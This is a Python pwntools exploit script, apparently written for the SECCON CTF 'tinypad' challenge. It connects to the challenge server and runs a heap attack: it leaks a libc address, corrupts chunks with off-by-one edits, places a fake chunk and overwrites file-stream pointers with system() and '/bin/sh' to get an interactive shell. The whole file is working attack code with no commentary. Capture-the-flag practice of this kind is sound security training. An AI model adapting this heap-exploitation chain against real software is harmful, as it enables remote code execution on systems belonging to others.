#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time
#host = "10.211.55.28"
#port = 8888

host = "tinypad.pwn.seccon.jp"
port = 57463

r = remote(host,port)

def add(size,content):
    r.recvuntil("(CMD)>>>")
    r.sendline("A")
    r.recvuntil("(SIZE)>>>")
    r.sendline(str(size))
    r.recvuntil("(CONTENT)>>>")
    r.sendline(content)

def dele(idx):
    r.recvuntil("(CMD)>>>")
    r.sendline("D")
    r.recvuntil("(INDEX)>>>")
    r.sendline(str(idx))


def edit(idx,content):
    r.recvuntil("(CMD)>>>")
    r.sendline("E")
    r.recvuntil("(INDEX)>>>")
    r.sendline(str(idx))
    r.recvuntil("(CONTENT)>>>")
    r.sendline(content)
    r.recvuntil("(Y/n)>>>")
    r.sendline("Y")

add(0x18,"a"*16) #1
add(0xe0,"b"*16) #2
add(0xf0,"c"*16) #3
add(0x90,"d"*16) #4
dele(2)
dele(3)
r.recvuntil(" #   INDEX: 2")
r.recvuntil(" # CONTENT:")
#libc = u64(r.recvuntil("\n")[1:-1].ljust(8,"\x00")) - 0x3c3b78
libc = u64(r.recvuntil("\n")[1:-1].ljust(8,"\x00")) - 0x3be7b8
print "libc:", hex(libc)
dele(1)
add(0x18,"e"*0x18) #1
add(0x80,"f"*0x30) #2
add(0x40,"g"*0x30) #3
dele(2)
dele(4)
dele(3)
add(0x50,"ddaa") #2
fake= 0x602148
add(0x70,"d"*0x30+p64(fake)) #3
edit(3,"d"*0x2f)
edit(3,"d"*0x2e)
edit(3,"d"*0x2d)
edit(3,"d"*0x2c)
edit(3,"d"*0x2b)
edit(3,"d"*0x2a)
edit(3,"d"*0x28 + p64(0x51)[0])
dele(3)
add(0x40,"dada")
free_hook = libc + 0x3c57a8
#list_all = libc + 0x3c4520
list_all = libc + 0x3bf1a0
add(0x40,p64(list_all))
tinypad = 0x602040
edit(2,"a"*5)
edit(2,"a"*4)
edit(2,p64(tinypad))
add(255,"a"*255)
#system = libc + 0x45390
system = libc + 0x46590
edit(3,"/bin/sh\x00"+p64(system)*2 + p64(0x602030) + p64(system)*12 + p64(tinypad)*11 + p64(tinypad+0x10) + p64(tinypad)*4)
dele(2)
r.interactive()
